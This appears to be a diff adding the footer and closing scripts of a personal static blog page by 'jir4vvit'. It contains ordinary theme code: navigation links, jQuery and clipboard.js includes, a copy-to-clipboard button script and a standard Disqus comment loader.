+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
